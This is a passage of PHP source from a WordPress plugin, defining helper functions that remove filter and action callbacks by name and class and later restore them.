			$emoji_svg_url = apply_filters( 'emoji_svg_url', 'https://s.w.org/images/core/emoji/11/svg/' );
			$urls          = array_diff( $urls, array( $emoji_svg_url ) );
		}
		return $urls;
	}
}



/* WordPress filters
-------------------------------------------------------------------------------- */

// Remove filters and actions by method name and return old settings
if ( ! function_exists( 'trx_addons_remove_filter' ) ) {
	function trx_addons_remove_filter( $filter_name, $callback_name, $class_name = '' ) {
		global $wp_filter;
		$rez = false;
		if ( ! empty( $wp_filter[ $filter_name ] ) && ( is_array( $wp_filter[ $filter_name ] ) || is_object( $wp_filter[ $filter_name ] ) ) ) {
			foreach ( $wp_filter[ $filter_name ] as $p => $cb ) {
				foreach ( $cb as $k => $v ) {
					if ( strpos( $k, $callback_name ) !== false
						&& ( empty( $class_name )
							|| ! is_array( $v['function'] )
							|| ! is_object( $v['function'][0] )
							// This way needs for the full class name (with namespace)
							|| get_class( $v['function'][0] ) == $class_name
							// This way compare a class name with a last portion of the full class name
							//|| substr( get_class( $v['function'][0] ), strlen( $class_name ) ) == $class_name
							)
					) {
						$rez = array(
							'filter'   => $filter_name,
							'key'      => $k,
							'callback' => $v,
							'priority' => $p
						);
						remove_filter( $filter_name, $v['function'], $p );
					}
				}
			}
		}
		return $rez;
	}
}

// Analog
if ( ! function_exists( 'trx_addons_remove_action' ) ) {
	function trx_addons_remove_action( $filter_name, $callback_name, $class_name = '' ) {
		return trx_addons_remove_filter( $filter_name, $callback_name, $class_name );
	}
}


// Restore previously removed filter handler
if ( ! function_exists( 'trx_addons_restore_filter' ) ) {
	function trx_addons_restore_filter( $filter ) {
		global $wp_filter;
		if ( ! empty( $filter['filter'] ) ) {
			$filter_name     = $filter['filter'];
			$filter_key      = $filter['key'];
			$filter_callback = $filter['callback'];
			$filter_priority = $filter['priority'];
			if ( ! isset( $wp_filter[ $filter_name ][ $filter_priority ][ $filter_key ] ) ) {
				add_filter( $filter_name, $filter_callback['function'], $filter_priority, $filter_callback['accepted_args'] );
			}
		}
	}
}

// Analog
if ( ! function_exists( 'trx_addons_restore_action' ) ) {
	function trx_addons_restore_action( $filter ) {
		return trx_addons_restore_filter( $filter );
	}
}
